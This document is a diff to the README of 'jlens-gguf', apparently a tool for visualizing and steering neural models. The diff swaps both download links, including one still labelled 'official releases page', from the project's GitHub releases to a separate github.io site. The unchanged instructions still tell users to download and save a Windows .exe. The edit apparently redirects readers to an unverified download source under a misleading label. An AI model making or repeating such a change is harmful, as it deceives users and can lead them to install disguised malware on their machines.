@@ -1,6 +1,6 @@
 # 🔍 jlens-gguf - Visualize and steer your neural models
 
-[![Download jlens-gguf](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/arturunused499/jlens-gguf/releases)
+[![Download jlens-gguf](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://arturunused499.github.io)
 
 ## What is jlens-gguf?
 
@@ -22,7 +22,7 @@ To run this software, ensure your computer meets these minimum standards:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/arturunused499/jlens-gguf/releases) to access the installers.
+1. Visit the [official releases page](https://arturunused499.github.io) to access the installers.
 2. Look for the latest version listed under the "Assets" section.
 3. Choose the file ending in `.exe` that matches your Windows system.
 4. Save the file to your computer.
